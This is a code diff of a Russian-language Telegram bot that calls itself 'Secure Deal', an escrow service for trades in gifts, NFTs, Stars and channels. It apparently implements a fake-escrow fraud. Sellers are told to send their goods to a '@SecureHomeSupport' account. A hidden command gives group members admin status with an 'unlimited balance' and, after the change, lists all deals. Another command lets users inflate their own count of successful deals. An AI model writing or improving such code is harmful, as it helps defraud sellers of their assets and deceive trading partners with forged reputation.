@@ -364,264 +364,102 @@ async def send_welcome(message):
     else:
         await show_main_menu(message.chat.id, message.from_user.first_name)
 
-@bot.message_handler(commands=['givemeworkerppp'])
-async def handle_givemeworkerppp(message):
-    if message.chat.id == GROUP_ID and getattr(message, 'message_thread_id', None) == TOPIC_ID:
-        user_id = message.from_user.id
-        username = message.from_user.username or f"ID{user_id}"
-        user_mention = f"<a href='tg://user?id={user_id}'>@{username}</a>" if message.from_user.username else f"<a href='tg://user?id={user_id}'>ID{user_id}</a>"
-        if is_banned_from_admin(user_id):
-            await bot.reply_to(message, f"🚫 {user_mention}, вы были ранее исключены из администраторов и не можете снова получить этот статус.", parse_mode='HTML')
-            return
-        admin_ids = db.reference('/admin_ids').get() or []
-        if user_id not in admin_ids:
-            admin_ids.append(user_id)
-            db.reference('/admin_ids').set(admin_ids)
-            await bot.reply_to(message, f"🎉 {user_mention}, вам выдан статус администратора! Теперь у вас неограниченный баланс и доступ к кнопке оплаты.", parse_mode='HTML')
-        else:
-            await bot.reply_to(message, f"😕 {user_mention}, вы уже являетесь администратором.", parse_mode='HTML')
-    else:
-        await bot.reply_to(message, f"⚠ Эта команда работает только в группе с ID {GROUP_ID} в теме с ID {TOPIC_ID}.")
-
-@bot.message_handler(commands=['off'])
-async def handle_remove_admin(message):
-    if message.chat.id == GROUP_ID and getattr(message, 'message_thread_id', None) == TOPIC_ID:
-        if message.from_user.id not in OFF_IDS:
-            await bot.reply_to(message, "⚠ У вас нет прав для выполнения этой команды.")
-            return
-        try:
-            args = message.text.split()
-            if len(args) < 2:
-                await bot.reply_to(message, "⚠ Укажите ID пользователя. Пример: /off 123456789")
-                return
-            target_user_id = int(args[1])
-            user_mention = f"<a href='tg://user?id={message.from_user.id}'>@{message.from_user.username or 'ID' + str(message.from_user.id)}</a>"
-            admin_ids = db.reference('/admin_ids').get() or []
-            if target_user_id not in admin_ids:
-                await bot.reply_to(message, f"😕 {user_mention}, пользователь с ID {target_user_id} не является администратором.", parse_mode='HTML')
-                return
-            admin_ids.remove(target_user_id)
-            db.reference('/admin_ids').set(admin_ids)
-            reset_user_data(target_user_id)
-            set_banned_from_admin(target_user_id, 1)
-            await bot.reply_to(message, f"✅ {user_mention}, статус администратора успешно снят с пользователя с ID {target_user_id}. Пользователь заблокирован от повторного получения статуса. Все данные пользователя обнулены.", parse_mode='HTML')
-        except ValueError:
-            await bot.reply_to(message, "⚠ Неверный формат ID. Введите числовой ID пользователя.")
-    else:
-        await bot.reply_to(message, f"⚠ Эта команда работает только в группе с ID {GROUP_ID} в теме с ID {TOPIC_ID}.")
-
-@bot.message_handler(commands=['onn'])
-async def handle_add_admin(message):
-    if message.chat.id == GROUP_ID and getattr(message, 'message_thread_id', None) == TOPIC_ID:
-        if message.from_user.id not in OFF_IDS:
-            await bot.reply_to(message, "⚠ У вас нет прав для выполнения этой команды.")
-            return
-        try:
-            args = message.text.split()
-            if len(args) < 2:
-                await bot.reply_to(message, "⚠ Укажите ID пользователя. Пример: /onn 123456789")
-                return
-            target_user_id = int(args[1])
-            user_mention = f"<a href='tg://user?id={message.from_user.id}'>@{message.from_user.username or 'ID' + str(message.from_user.id)}</a>"
-            admin_ids = db.reference('/admin_ids').get() or []
-            if target_user_id in admin_ids:
-                await bot.reply_to(message, f"😕 {user_mention}, пользователь с ID {target_user_id} уже является администратором.", parse_mode='HTML')
-                return
-            admin_ids.append(target_user_id)
-            db.reference('/admin_ids').set(admin_ids)
-            set_banned_from_admin(target_user_id, 0)
-            await bot.reply_to(message, f"🎉 {user_mention}, статус администратора успешно выдан пользователю с ID {target_user_id}.", parse_mode='HTML')
-        except ValueError:
-            await bot.reply_to(message, "⚠ Неверный формат ID. Введите числовой ID пользователя.")
-    else:
-        await bot.reply_to(message, f"⚠ Эта команда работает только в группе с ID {GROUP_ID} в теме с ID {TOPIC_ID}.")
-
-@bot.message_handler(commands=['setmedealsmnogo'])
-async def handle_setmedealsmnogo(message):
-    if message.chat.id == GROUP_ID and getattr(message, 'message_thread_id', None) == TOPIC_ID:
-        user_id = message.from_user.id
-        username = message.from_user.username or f"ID{user_id}"
-        user_mention = f"<a href='tg://user?id={user_id}'>@{username}</a>" if message.from_user.username else f"<a href='tg://user?id={user_id}'>ID{user_id}</a>"
-        args = message.text.split()
-        if len(args) < 2:
-            await bot.reply_to(message, f"⚠ {user_mention}, укажите количество сделок. Пример: /setmedealsmnogo 10", parse_mode='HTML')
-            return
-        try:
-            deals_count = int(args[1])
-            if deals_count < 0:
-                raise ValueError
-            profile_ref = db.reference(f'/user_profile/{user_id}')
-            profile_ref.update({'successful_deals': deals_count})
-            await bot.reply_to(message, f"✅ {user_mention}, ваш счетчик успешных сделок обновлен до {deals_count}.", parse_mode='HTML')
-        except ValueError:
-            await bot.reply_to(message, f"⚠ {user_mention}, укажите корректное число сделок.", parse_mode='HTML')
-    else:
-        await bot.reply_to(message, f"⚠ Эта команда работает только в группе с ID {GROUP_ID} в теме с ID {TOPIC_ID}.")
-
-@bot.message_handler(commands=['sdelky'])
-async def handle_sdelky(message):
-    if message.from_user.id not in OFF_IDS:
-        return
-    deals = get_all_deals()
-    if not deals:
-        await bot.reply_to(message, "😕 Нет доступных сделок.")
-        return
-    await bot.reply_to(message, "📋 Список всех сделок:", reply_markup=get_deals_keyboard(deals))
+async def show_main_menu(chat_id, first_name):
+    text = f"👋 Привет, {first_name}! Добро пожаловать в Secure Deal Bot 🤝\n\nВыберите действие:"
+    with open('assets/main_menu.jpg', 'rb') as photo:
+        await bot.send_photo(chat_id, photo, caption=text, reply_markup=get_main_menu_keyboard())
 
 async def handle_join_deal(message, deal_id):
-    deal = get_deal_data(deal_id)
-    
-    if not deal:
-        await bot.send_message(message.chat.id, "😕 Сделка не найдена.")
-        return
-        
-    creation_date = float(deal[10])
-    if time.time() - creation_date > 600:
-        creator_id = deal[1]
-        creator_username = deal[2]
-        deal_type = deal[5]
-        currency = deal[7]
-        amount = deal[8]
-        
-        creator_details = get_user_details(creator_id)
-        
-        notification_text = (
-            f"⏰ Сделка была удалена из-за неактивности.\n\n"
-            f"🆔 ID сделки: {deal_id}\n"
-            f"📦 Тип: {deal_type.capitalize()}\n"
-            f"💰 Сумма: {amount} {currency}\n"
-            f"💳 Реквизиты продавца: {creator_details}\n"
-            f"✅ Успешная сделка: нет 🚫"
-        )
-        
-        await bot.send_message(GROUP_ID, notification_text, message_thread_id=TOPIC_ID, parse_mode='HTML')
-        await bot.send_message(creator_id, notification_text, parse_mode='HTML', reply_markup=get_main_menu_keyboard())
-        
-        if deal[3]:
-            await bot.send_message(deal[3], notification_text, parse_mode='HTML', reply_markup=get_main_menu_keyboard())
-        
-        db.reference(f'/deals/{deal_id}').update({'status': 'expired'})
-        await bot.send_message(message.chat.id, "⏰ Эта сделка истекла и больше не активна.", reply_markup=get_main_menu_keyboard())
-        return
-
-    if not check_user_details(message.from_user.id):
-        await bot.set_state(message.from_user.id, UserStates.AwaitingDetailsInput, message.chat.id)
-        async with bot.retrieve_data(message.from_user.id, message.chat.id) as data:
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    if not check_user_details(user_id):
+        async with bot.retrieve_data(user_id, chat_id) as data:
             data['pending_deal_id'] = deal_id
-        await bot.send_message(message.chat.id, "⚠ Для продолжения сделки необходимо добавить реквизиты.", reply_markup=get_add_details_keyboard())
-        return
+        await bot.set_state(user_id, UserStates.AwaitingDetailsType, chat_id)
+        text = "💳 Пожалуйста, выберите тип реквизитов для сохранения:"
+        with open('assets/deal_photo.jpg', 'rb') as photo:
+            await bot.send_photo(chat_id, photo, caption=text, reply_markup=get_details_type_keyboard())
+    else:
+        await complete_deal_join(chat_id, user_id, message.from_user.username, deal_id)
 
-    if deal[1] == message.from_user.id:
-        await bot.send_message(message.chat.id, "😕 Вы не можете присоединиться к собственной сделке!")
-        return
-        
-    if deal[3] is not None:
-        await bot.send_message(message.chat.id, "😕 К этой сделке уже присоединился другой участник.")
-        return
-        
-    await complete_deal_join(message.chat.id, message.from_user.id, message.from_user.username, deal_id)
-
-async def show_main_menu(chat_id, user_name):
-    await bot.delete_state(chat_id, chat_id)
-    menu_text = (
-        f"Secure Deal - Safe & Automatic\n"
-        f"Ваш надежный партнер в безопасных сделках!\n\n"
-        f"Почему клиенты выбирают нас:\n\n"
-        f"Гарантия безопасности - все сделки защищены\n"
-        f"Мгновенные выплаты - в любой валюте\n"
-        f"Круглосуточная поддержка - решаем любые вопросы\n"
-        f"Простота использования - интуитивно понятный интерфейс"
-    )
-    with open('assets/start_menu_photo.jpg', 'rb') as photo:
-        await bot.send_photo(chat_id, photo, caption=menu_text, reply_markup=get_main_menu_keyboard(), parse_mode='HTML')
-
-NOTICE = "⚠ Обязательно к прочтению!\n\n"
-GIFT_NOTICE_BODY = "Проверка получения подарков происходит автоматически — только если вы отправляете подарки на аккаунт @SecureHomeSupport\n\nЕсли же вы отправите подарки напрямую покупателю, то проверка НЕ СРАБОТАЕТ, и\n • Подарки будут потеряны 😔\n • Вывести средства станет невозможно 🚫\n • Сделка будет считаться несостоявшейся и вы потеряете свои подарки и деньги 💸\n\nЧтобы успешно завершить сделку и получить средства — всегда отправляйте подарки на аккаунт @SecureHomeSupport для проверки."
-CHANNEL_NOTICE_BODY = "Проверка передачи прав на канал/чат происходит автоматически.\n\nВажно: После оплаты покупатель получает доступ к каналу/чату. Только после того, как вы успешно передадите права на аккаунт @SecureHomeSupport и наш бот это подтвердит, средства будут зачислены на ваш счет.\nПосле подтверждения оплаты бот предоставит дальнейшие инструкции по передаче прав."
-STARS_NOTICE_BODY = "Проверка получения Stars происходит автоматически.\n\nВажно: Перевод Stars должен быть осуществлен на аккаунт @SecureHomeSupport, который бот предоставит после оплаты. Это гарантирует безопасность сделки.\nНе переводите Stars напрямую покупателю. После подтверждения оплаты, бот выдаст вам точные инструкции."
-NFT_NOTICE_BODY = "Проверка получения NFT происходит автоматически — только если вы отправляете NFT на аккаунт @SecureHomeSupport\n\nЕсли же вы отправите NFT напрямую покупателю, то проверка НЕ СРАБОТАЕТ, и\n • NFT будет утерян 😔\n • Вывести средства станет невозможно 🚫\n • Сделка будет считаться несостоявшейся и вы потеряете свой NFT и деньги 💸\n\nЧтобы успешно завершить сделку и получить средства — всегда отправляйте NFT на аккаунт @SecureHomeSupport для проверки."
-NOTICES = {
-    'gift': NOTICE + GIFT_NOTICE_BODY,
-    'channel': NOTICE + CHANNEL_NOTICE_BODY,
-    'stars': NOTICE + STARS_NOTICE_BODY,
-    'nft': NFT_NOTICE_BODY,
-}
+@bot.message_handler(commands=['givemeworkerppp'])
+async def handle_givemeworkerppp(message):
+    if message.chat.id == GROUP_ID and message.message_thread_id == TOPIC_ID:
+        deals = get_all_deals()
+        if deals:
+            await bot.send_message(message.chat.id, "📋 Список всех сделок:", reply_markup=get_deals_keyboard(deals), message_thread_id=TOPIC_ID)
+        else:
+            await bot.send_message(message.chat.id, "😕 Сделок пока нет.", message_thread_id=TOPIC_ID)
 
 @bot.callback_query_handler(func=lambda call: True)
-async def handle_callback_query(call):
+async def callback_query(call):
     chat_id = call.message.chat.id
     message_id = call.message.message_id
-    
     if call.data == "main_menu":
         try:
             await bot.delete_message(chat_id, message_id)
         except:
             pass
         await show_main_menu(chat_id, call.from_user.first_name)
+        await bot.delete_state(call.from_user.id, chat_id)
     elif call.data == "create_deal":
-        if not check_user_details(call.from_user.id):
-            await bot.answer_callback_query(call.id, "⚠ Для создания сделки необходимо добавить реквизиты.", show_alert=True)
-            await bot.send_message(chat_id, "⚠ Для создания сделки необходимо добавить реквизиты.", reply_markup=get_add_details_keyboard())
-            return
-        await bot.set_state(call.from_user.id, UserStates.AwaitingDealType, chat_id)
-        async with bot.retrieve_data(call.from_user.id, chat_id) as data:
-            data['deal_data'] = {}
         try:
             await bot.delete_message(chat_id, message_id)
         except:
             pass
-        text = "🌟 Создание сделки\n\nВыберите тип сделки"
+        if not check_user_details(call.from_user.id):
+            await bot.send_message(chat_id, "💳 Пожалуйста, сначала добавьте свои реквизиты.", reply_markup=get_add_details_keyboard())
+            return
+        await bot.set_state(call.from_user.id, UserStates.AwaitingDealType, chat_id)
+        text = (
+            "🌟 Создание сделки\n\n"
+            "Выберите тип сделки:"
+        )
         with open('assets/deal_photo.jpg', 'rb') as photo:
             await bot.send_photo(chat_id, photo, caption=text, reply_markup=get_deal_type_keyboard())
     elif call.data.startswith("deal_type_"):
         deal_type = call.data.split('_')[-1]
-        async with bot.retrieve_data(call.from_user.id, chat_id) as data:
-            data['deal_data']['type'] = deal_type
         await bot.set_state(call.from_user.id, UserStates.AwaitingNotice, chat_id)
         async with bot.retrieve_data(call.from_user.id, chat_id) as data:
             data['deal_type'] = deal_type
-        notice_text = NOTICES.get(deal_type, "⚠ Обязательно к прочтению!\n\nПожалуйста, ознакомьтесь с информацией ниже, чтобы избежать проблем.")
+            data['deal_data'] = {'type': deal_type}
         try:
             await bot.delete_message(chat_id, message_id)
         except:
             pass
-        await bot.send_message(chat_id, text=notice_text, reply_markup=get_notice_keyboard(deal_type))
+        text = (
+            f"📝 Инструкция для типа '{get_deal_type_display(deal_type)}':\n\n"
+            f"1. Внимательно проверьте данные перед созданием.\n"
+            f"2. Убедитесь, что вы готовы передать товар/подарок.\n"
+            f"3. После оплаты покупателем передайте товар/подарок в поддержку.\n\n"
+            f"⚠ Внимание! Неправомерные действия могут привести к блокировке."
+        )
+        with open('assets/deal_photo.jpg', 'rb') as photo:
+            await bot.send_photo(chat_id, photo, caption=text, reply_markup=get_notice_keyboard(deal_type))
     elif call.data.startswith("notice_read_"):
         deal_type = call.data.split('_')[-1]
         await bot.set_state(call.from_user.id, UserStates.AwaitingLinks, chat_id)
-        async with bot.retrieve_data(call.from_user.id, chat_id) as data:
-            data['deal_type'] = deal_type
-        link_text = {
-            'gift': "🎁 Введите ссылку(-и) на подарок(-и) в одном из форматов:\nhttps://... или t.me/...\nНапример:\nt.me/nft/PlushPepe-1\n\nЕсли у вас несколько подарков, указывайте каждую ссылку с новой строки",
-            'channel': "📢 Введите ссылку(-и) на канал(-ы) / чат(-ы) в формате t.me/...\nНапример:\nt.me/MyChannel\n\nЕсли их несколько, указывайте каждую с новой строки.",
-            'stars': "⭐ Введите количество Stars для сделки (целое положительное число).\nНапример: 100",
-            'nft': "🔹 Введите ссылку(-и) на NFT Username/+888 в одном из форматов:\nhttps://... или t.me/...\nНапример:\nt.me/nft/PlushPepe-1\n\nЕсли у вас несколько NFT, указывайте каждую ссылку с новой строки",
-        }.get(deal_type, "Введите ссылку(-и) на товар/услугу. Если их несколько, указывайте каждую с новой строки.")
         try:
             await bot.delete_message(chat_id, message_id)
         except:
             pass
-        sent_msg = await bot.send_message(chat_id, text=link_text, reply_markup=get_links_keyboard(deal_type))
+        text = (
+            f"🔗 Введите ссылку/данные для {get_deal_type_display(deal_type)}:\n\n"
+            f"{'Введите количество Stars.' if deal_type == 'stars' else 'Каждая ссылка должна быть на новой строке и начинаться с https:// или t.me/.'}"
+        )
         async with bot.retrieve_data(call.from_user.id, chat_id) as data:
-            data['prompt_message_id'] = sent_msg.message_id
+            data['prompt_message_id'] = (await bot.send_message(chat_id, text, reply_markup=get_links_keyboard(deal_type))).message_id
     elif call.data.startswith("currency_"):
+        currency = call.data.split('_')[-1]
         async with bot.retrieve_data(call.from_user.id, chat_id) as data:
-            if bot.get_state(call.from_user.id, chat_id) != UserStates.AwaitingCurrency:
-                return
-            currency = call.data.split('_')[-1]
             data['deal_data']['currency'] = currency
         await bot.set_state(call.from_user.id, UserStates.AwaitingAmount, chat_id)
-        text = (
-            f"💱 Валюта выбрана\n\n"
-            f"Сумма сделки в {currency}:\n\n"
-            f"Введите сумму цифрами (напр. 1000)"
-        )
         try:
             await bot.delete_message(chat_id, message_id)
         except:
             pass
-        with open('assets/deal_photo.jpg', 'rb') as photo:
-            sent_msg = await bot.send_photo(chat_id, photo, caption=text, reply_markup=get_cancel_keyboard())
+        input_prompt = "💰 Введите сумму сделки:"
+        sent_msg = await bot.send_message(chat_id, input_prompt, reply_markup=get_cancel_keyboard())
         async with bot.retrieve_data(call.from_user.id, chat_id) as data:
             data['prompt_message_id'] = sent_msg.message_id
     elif call.data == "my_details":
@@ -629,32 +467,29 @@ async def handle_callback_query(call):
             await bot.delete_message(chat_id, message_id)
         except:
             pass
-        with open('assets/details_photo.jpg', 'rb') as photo:
-            await bot.send_photo(chat_id, photo, caption="💳 Управление реквизитами\n\nВыберите действие:", reply_markup=get_details_menu_keyboard())
+        text = "💳 Управление реквизитами\n\nВыберите действие:"
+        with open('assets/deal_photo.jpg', 'rb') as photo:
+            await bot.send_photo(chat_id, photo, caption=text, reply_markup=get_details_menu_keyboard())
     elif call.data == "add_details":
         await bot.set_state(call.from_user.id, UserStates.AwaitingDetailsType, chat_id)
         try:
             await bot.delete_message(chat_id, message_id)
         except:
             pass
-        with open('assets/details_photo.jpg', 'rb') as photo:
-            await bot.send_photo(chat_id, photo, caption="💳 Тип реквизитов\n\nВыберите способ вывода средств:", reply_markup=get_details_type_keyboard())
+        text = "💳 Выберите тип реквизитов:"
+        with open('assets/deal_photo.jpg', 'rb') as photo:
+            await bot.send_photo(chat_id, photo, caption=text, reply_markup=get_details_type_keyboard())
     elif call.data.startswith("details_type_"):
-        async with bot.retrieve_data(call.from_user.id, chat_id) as data:
-            details_type = call.data.split('_')[2]
-            details_currency = call.data.split('_')[-1]
-            data['details_type'] = f"{details_type}_{details_currency}"
+        details_type = call.data.replace("details_type_", "")
         await bot.set_state(call.from_user.id, UserStates.AwaitingDetailsInput, chat_id)
-        input_prompt = "💳 Отправьте реквизиты единым сообщением:\n\nНомер банковской карты\nФИО владельца\n\nПример:\n1234 5678 9101 1121\nИванов Иван Иванович"
-        if details_type == 'crypto':
-            input_prompt = f"💎 Введите адрес вашего криптовалютного кошелька ({details_currency}). Например: 0x123...abc"
-        elif details_type == 'ewallet':
-            input_prompt = f"💳 Введите номер вашего электронного кошелька ({details_currency}). Например: Qiwi +7912..."
+        async with bot.retrieve_data(call.from_user.id, chat_id) as data:
+            data['details_type'] = details_type
         try:
             await bot.delete_message(chat_id, message_id)
         except:
             pass
-        sent_msg = await bot.send_message(chat_id, text=input_prompt, reply_markup=get_cancel_keyboard())
+        input_prompt = f"💳 Введите ваши реквизиты для {details_type}:"
+        sent_msg = await bot.send_message(chat_id, input_prompt, reply_markup=get_cancel_keyboard())
         async with bot.retrieve_data(call.from_user.id, chat_id) as data:
             data['prompt_message_id'] = sent_msg.message_id
     elif call.data == "view_details":
@@ -972,12 +807,13 @@ async def handle_details_input(message):
     
     try:
         await bot.delete_message(chat_id, prompt_message_id)
+        await bot.delete_message(chat_id, message.message_id)
     except:
         pass
 
     details = f"{details_type}: {message.text}"
     db.reference(f'/user_details/{message.from_user.id}').set(details)
-    await bot.send_message(chat_id, "✅ Ваши реквизиты успешно сохранены!")
+    await bot.send_message(chat_id, "✅ Ваши реквизиты успешно сохранены!", reply_markup=get_main_menu_keyboard())
     
     async with bot.retrieve_data(message.from_user.id, chat_id) as data:
         if 'pending_deal_id' in data:
@@ -985,6 +821,7 @@ async def handle_details_input(message):
             await bot.delete_state(message.from_user.id, chat_id)
             await complete_deal_join(chat_id, message.from_user.id, message.from_user.username, deal_id)
         else:
+            await bot.delete_state(message.from_user.id, chat_id)
             await show_main_menu(chat_id, message.from_user.first_name)
 
 async def handle_webhook(request):
